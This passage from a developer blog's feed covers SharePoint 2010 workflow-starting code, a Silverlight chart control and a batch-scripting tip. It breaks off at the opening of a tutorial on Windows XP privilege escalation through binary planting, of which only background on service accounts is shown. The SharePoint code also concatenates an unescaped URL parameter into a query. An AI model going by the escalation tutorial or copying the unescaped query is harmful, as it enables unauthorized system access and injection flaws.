&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='javascript'&gt;&lt;span class='kd'&gt;var&lt;/span&gt; &lt;span class='nx'&gt;ItemID&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt; &lt;span class='nx'&gt;getParameterByName&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;ItemID&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;

&lt;span class='c1'&gt;// Construct the CAML Query&lt;/span&gt;
&lt;span class='kd'&gt;var&lt;/span&gt; &lt;span class='nx'&gt;CamlQuery&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;&amp;lt;Query&amp;gt;&amp;lt;Where&amp;gt;&amp;lt;Eq&amp;gt;&amp;lt;FieldRef Name=&amp;#39;ID&amp;#39; /&amp;gt;&amp;lt;Value Type=&amp;#39;Counter&amp;#39;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='nx'&gt;ItemID&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;&amp;lt;/Value&amp;gt;&amp;lt;/Eq&amp;gt;&amp;lt;/Where&amp;gt;&amp;lt;/Query&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;

 
&lt;span class='c1'&gt;// Fire GetListItems web service to find the Approval contact&lt;/span&gt;
&lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;().&lt;/span&gt;&lt;span class='nx'&gt;SPServices&lt;/span&gt;&lt;span class='p'&gt;({&lt;/span&gt;
    &lt;span class='nx'&gt;operation&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;GetListItems&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
    &lt;span class='nx'&gt;async&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='kc'&gt;false&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
    &lt;span class='nx'&gt;CAMLQuery&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='nx'&gt;CamlQuery&lt;/span&gt; &lt;span class='p'&gt;,&lt;/span&gt;
    &lt;span class='nx'&gt;listName&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;Intake Requests&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
    &lt;span class='nx'&gt;CAMLViewFields&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;&amp;lt;ViewFields&amp;gt;&amp;lt;FieldRef Name=&amp;#39;Band_x0020_45_x0020_Approval&amp;#39; /&amp;gt;&amp;lt;/ViewFields&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
    &lt;span class='nx'&gt;completefunc&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='kd'&gt;function&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;xData&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='nx'&gt;Status&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt; 
	&lt;span class='p'&gt;{&lt;/span&gt;
        
        &lt;span class='nx'&gt;events&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='nb'&gt;Array&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;
        &lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;xData&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;responseXML&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;find&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;z\\:row&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;each&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kd'&gt;function&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt; 
		&lt;span class='p'&gt;{&lt;/span&gt;
				
                &lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;attr&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;ows_Band_x0020_45_x0020_Approval&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
				&lt;span class='kd'&gt;var&lt;/span&gt; &lt;span class='nx'&gt;index&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;indexOf&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;;&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
				&lt;span class='nx'&gt;approverID&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;slice&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='mi'&gt;0&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;&lt;span class='nx'&gt;index&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
				
				&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;substring&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;index&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='mi'&gt;2&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;length&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
				
          
			
        &lt;span class='p'&gt;})&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='p'&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;When we retrieve the person or group field from the web services, it is returned as &lt;strong&gt;1;#Madhur Ahuja&lt;/strong&gt;. Where 1 is the ID of the row in User Information List and &lt;strong&gt;Madhur Ahuja&lt;/strong&gt; is the display name. To pass it to Approval Workflow, we need the login name.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will query the &lt;strong&gt;User Information List&lt;/strong&gt; to obtain the login name.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='javascript'&gt;&lt;span class='c1'&gt;// We will just get the DisplayName and ID, but not the Login Name, we will fire another web service to fetch the loginName of the User &lt;/span&gt;
&lt;span class='k'&gt;if&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='o'&gt;!=&lt;/span&gt;&lt;span class='kc'&gt;null&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
&lt;span class='p'&gt;{&lt;/span&gt;
		
		 &lt;span class='kd'&gt;var&lt;/span&gt; &lt;span class='nx'&gt;xmlData&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;&amp;lt;soap:Envelope xmlns:soap=&amp;#39;http://schemas.xmlsoap.org/soap/envelope/&amp;#39; xmlns:xsi=&amp;#39;http://www.w3.org/2001/XMLSchema-instance&amp;#39; xmlns:xsd=&amp;#39;http://www.w3.org/2001/XMLSchema&amp;#39;&amp;gt;&amp;lt;soap:Body&amp;gt;&amp;lt;GetListItems xmlns=&amp;#39;http://schemas.microsoft.com/sharepoint/soap/&amp;#39;&amp;gt;&amp;lt;listName&amp;gt;User Information List&amp;lt;/listName&amp;gt;&amp;lt;query&amp;gt;&amp;lt;Query xmlns=&amp;#39;&amp;#39;&amp;gt;&amp;lt;Where&amp;gt;&amp;lt;Eq&amp;gt;&amp;lt;FieldRef Name=&amp;#39;ID&amp;#39; /&amp;gt;&amp;lt;Value Type=&amp;#39;Counter&amp;#39;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='nx'&gt;approverID&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;&amp;lt;/Value&amp;gt;&amp;lt;/Eq&amp;gt;&amp;lt;/Where&amp;gt;&amp;lt;OrderBy&amp;gt;&amp;lt;FieldRef Name=&amp;#39;Title&amp;#39; /&amp;gt;&amp;lt;/OrderBy&amp;gt;&amp;lt;/Query&amp;gt;&amp;lt;/query&amp;gt;&amp;lt;viewFields&amp;gt;&amp;lt;ViewFields xmlns=&amp;#39;&amp;#39; /&amp;gt;&amp;lt;/viewFields&amp;gt;&amp;lt;queryOptions&amp;gt;&amp;lt;QueryOptions xmlns=&amp;#39;&amp;#39; /&amp;gt;&amp;lt;/queryOptions&amp;gt;&amp;lt;/GetListItems&amp;gt;&amp;lt;/soap:Body&amp;gt;&amp;lt;/soap:Envelope&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;

		 &lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;ajax&lt;/span&gt;&lt;span class='p'&gt;({&lt;/span&gt;
		   &lt;span class='nx'&gt;url&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;/sites/nishantverma/_vti_bin/lists.asmx&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;type&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;async&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='kc'&gt;false&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;dataType&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;xml&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;data&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='nx'&gt;xmlData&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; 
		   &lt;span class='nx'&gt;complete&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt;&lt;span class='nx'&gt;SuccessFunc&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;error&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='nx'&gt;ErrorFunc&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;contentType&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;text/xml; charset=\&amp;quot;utf-8\&amp;quot;&amp;quot;&lt;/span&gt;
		  &lt;span class='p'&gt;});&lt;/span&gt;
		  
		  &lt;span class='kd'&gt;function&lt;/span&gt; &lt;span class='nx'&gt;SuccessFunc&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;result&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
		  &lt;span class='p'&gt;{&lt;/span&gt;
			&lt;span class='c1'&gt;//xml node with namespace need to be handled differently for jQuery&lt;/span&gt;
			 &lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;result&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;responseXML&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;find&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;z\\:row&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;each&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kd'&gt;function&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt; 
			 &lt;span class='p'&gt;{&lt;/span&gt;
				
				&lt;span class='nx'&gt;loginName&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;attr&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;ows_Name&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
				
				
			&lt;span class='p'&gt;});&lt;/span&gt;
		&lt;span class='p'&gt;}&lt;/span&gt;

		&lt;span class='kd'&gt;function&lt;/span&gt; &lt;span class='nx'&gt;ErrorFunc&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;result&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt; 
		&lt;span class='p'&gt;{&lt;/span&gt;
					&lt;span class='nx'&gt;alert&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;result&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;responseText&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
		&lt;span class='p'&gt;}&lt;/span&gt;
		
&lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;We get the login name in the variable &lt;strong&gt;ows_Name&lt;/strong&gt;. Now we can fire the Approval workflow passing it the login name. Note the &lt;strong&gt;templateId&lt;/strong&gt; below, its the GUID of the SharePoint 2010 Approval workflow which is associated with the list.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='javascript'&gt; &lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;().&lt;/span&gt;&lt;span class='nx'&gt;SPServices&lt;/span&gt;&lt;span class='p'&gt;({&lt;/span&gt;
				&lt;span class='nx'&gt;operation&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;StartWorkflow&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
				&lt;span class='nx'&gt;item&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;http://sp.madhurmoss.com/sites/nishantverma/GBSRequest/Lists/Intake%20Requests/&amp;quot;&lt;/span&gt; &lt;span class='o'&gt;+&lt;/span&gt; &lt;span class='nx'&gt;ItemID&lt;/span&gt; &lt;span class='o'&gt;+&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;_.000&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
				&lt;span class='nx'&gt;templateId&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;{10E4D465-A9B6-4146-BD50-E9A78888548D}&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
				&lt;span class='nx'&gt;workflowParameters&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='nx'&gt;assocData&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
				&lt;span class='nx'&gt;completefunc&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='kd'&gt;function&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt; 
				&lt;span class='p'&gt;{&lt;/span&gt;
					&lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;#intake&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;html&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;Your Intake Request has been sent to &amp;quot;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot; for his approval. Thanks for submitting the request. This page will redirect to homepage after few seconds&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
					
					&lt;span class='nb'&gt;window&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;setTimeout&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kd'&gt;function&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt; 
					&lt;span class='p'&gt;{&lt;/span&gt;
						&lt;span class='nb'&gt;window&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;location&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;href&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt; &lt;span class='s1'&gt;&amp;#39;/sites/nishantverma/GBSRequest&amp;#39;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
					&lt;span class='p'&gt;},&lt;/span&gt; &lt;span class='mi'&gt;5000&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
				&lt;span class='p'&gt;}&lt;/span&gt;
			  &lt;span class='p'&gt;});&lt;/span&gt;
			  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Here, the key is the variable &lt;em&gt;assocData&lt;/em&gt;, which is nothing but the Association Data of the workflow. In SharePoint 2010 Approval workflow, its the serialized XML of the infopath form. This variable is defnied as the XML string as below:&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='javascript'&gt;			&lt;span class='kd'&gt;var&lt;/span&gt; &lt;span class='nx'&gt;assocData&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='s1'&gt;&amp;#39;&amp;lt;dfs:myFields xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:dms=&amp;quot;http://schemas.microsoft.com/office/2009/documentManagement/types&amp;quot; xmlns:dfs=&amp;quot;http://schemas.microsoft.com/office/infopath/2003/dataFormSolution&amp;quot; xmlns:q=&amp;quot;http://schemas.microsoft.com/office/infopath/2009/WSSList/queryFields&amp;quot; xmlns:d=&amp;quot;http://schemas.microsoft.com/office/infopath/2009/WSSList/dataFields&amp;quot; xmlns:ma=&amp;quot;http://schemas.microsoft.com/office/2009/metadata/properties/metaAttributes&amp;quot; xmlns:pc=&amp;quot;http://schemas.microsoft.com/office/infopath/2007/PartnerControls&amp;quot; xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;dfs:queryFields&amp;gt;&amp;lt;/dfs:queryFields&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;dfs:dataFields&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:SharePointListItem_RW&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:Approvers&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:Assignment&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:Assignee&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;pc:Person&amp;gt;&amp;lt;pc:DisplayName&amp;gt;&amp;lt;/pc:DisplayName&amp;gt;&amp;lt;pc:AccountId&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='nx'&gt;loginName&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='s1'&gt;&amp;#39;&amp;lt;/pc:AccountId&amp;gt;&amp;lt;pc:AccountType&amp;gt;User&amp;lt;/pc:AccountType&amp;gt;&amp;lt;/pc:Person&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/d:Assignee&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:Stage xsi:nil=&amp;quot;true&amp;quot; /&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:AssignmentType&amp;gt;Serial&amp;lt;/d:AssignmentType&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/d:Assignment&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/d:Approvers&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:ExpandGroups&amp;gt;true&amp;lt;/d:ExpandGroups&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:NotificationMessage&amp;gt;Please approve&amp;lt;/d:NotificationMessage&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:DueDateforAllTasks xsi:nil=&amp;quot;true&amp;quot; /&amp;gt;&amp;lt;d:DurationforSerialTasks xsi:nil=&amp;quot;true&amp;quot; /&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:DurationUnits&amp;gt;Day&amp;lt;/d:DurationUnits&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:CC /&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:CancelonRejection&amp;gt;true&amp;lt;/d:CancelonRejection&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:CancelonChange&amp;gt;false&amp;lt;/d:CancelonChange&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:EnableContentApproval&amp;gt;false&amp;lt;/d:EnableContentApproval&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/d:SharePointListItem_RW&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/dfs:dataFields&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/dfs:myFields&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The full code can be downloaded from my &lt;a href='https://gist.github.com/1584225'&gt;gist&lt;/a&gt; here.&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>Silverlight Chart Control for SharePoint 2010</title>
   <link href="http://madhur.co.in/blog/2011/12/29/slchart.html"/>
   <updated>2011-12-29T00:00:00+05:30</updated>
   <id>id:/blog/2011/12/29/slchart</id>
   <content type="html">&lt;p&gt;I have pieced together a silverlight control for SharePoint 2010. The .XAP file and the source code is hosted at this &lt;a href='http://madhur.codeplex.com'&gt;codeplex project&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can see a live demo at this &lt;a href='/silverdemo/Index.html'&gt;location&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='key_features'&gt;Key Features&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Collapse/Expand of Nodes&lt;/li&gt;

&lt;li&gt;Reset Root anywhere within the Org Chart&lt;/li&gt;

&lt;li&gt;Root can be permanently set in web part through parameters&lt;/li&gt;

&lt;li&gt;Optionally draws dotted line based on input data.&lt;/li&gt;
&lt;/ul&gt;</content>
 </entry>
 
 <entry>
   <title>Windows command shell(cmd.exe) runs only first command</title>
   <link href="http://madhur.co.in/blog/2011/12/29/cmdshellfirst.html"/>
   <updated>2011-12-29T00:00:00+05:30</updated>
   <id>id:/blog/2011/12/29/cmdshellfirst</id>
   <content type="html">&lt;p&gt;If you written a command shell script and it exits after executing only first command, its probably because one of the command in the command script is itself a command script. In that case, such script needs to be called using the &lt;em&gt;call&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;For example,&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;@echo off
echo &amp;quot;Building Content&amp;quot;
jekyll --no-server --no-auto

echo &amp;quot;Checking out master&amp;quot;
git checkout master


echo &amp;quot;Copying the updated content to root&amp;quot;
cp -r _site/* . &amp;amp;&amp;amp; rm -rf _site/ &amp;amp;&amp;amp; touch .nojekyll

echo &amp;quot;Adding the content&amp;quot;
git add .

echo &amp;quot;Updated content&amp;quot;
git commit -am &amp;quot;Updated content&amp;quot;

echo &amp;quot;Pushed content&amp;quot;
git push --all origin
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The above script will simply exit after running the first command. This is because Jekyll itself runs as a batch file in Windows. To correct this, we need to call Jekyll with the use of &lt;em&gt;call&lt;/em&gt; command&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;@echo off
echo &amp;quot;Building Content&amp;quot;
call jekyll --no-server --no-auto

echo &amp;quot;Checking out master&amp;quot;
git checkout master


echo &amp;quot;Copying the updated content to root&amp;quot;
cp -r _site/* . &amp;amp;&amp;amp; rm -rf _site/ &amp;amp;&amp;amp; touch .nojekyll

echo &amp;quot;Adding the content&amp;quot;
git add .

echo &amp;quot;Updated content&amp;quot;
git commit -am &amp;quot;Updated content&amp;quot;

echo &amp;quot;Pushed content&amp;quot;
git push --all origin
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Privilege escalation on Windows using Binary Planting</title>
   <link href="http://madhur.co.in/blog/2011/09/23/privilegeescalation.html"/>
   <updated>2011-09-23T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/23/privilegeescalation</id>
   <content type="html">&lt;p&gt;This article is a tutorial on how to trick Windows XP into giving you system privileges using Binary Planting. There have been other previlege escalation methods which are no longer useable:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://h0bbel.p0ggel.org/windows-xp-privilege-escalation-exploit-no-it-isnt'&gt;Escalation using at command&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://technet.microsoft.com/en-us/security/bulletin/ms04-019'&gt;Escalation using Utilman.exe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Microsoft Windows services, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface. Each service executes in the security context of a user account.&lt;/p&gt;

&lt;p&gt;You can specify one of the following special accounts instead of specifying a user account for the service:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://msdn.microsoft.com/en-us/library/ms684188.aspx'&gt;LocalService&lt;/a&gt;&lt;/li&gt;

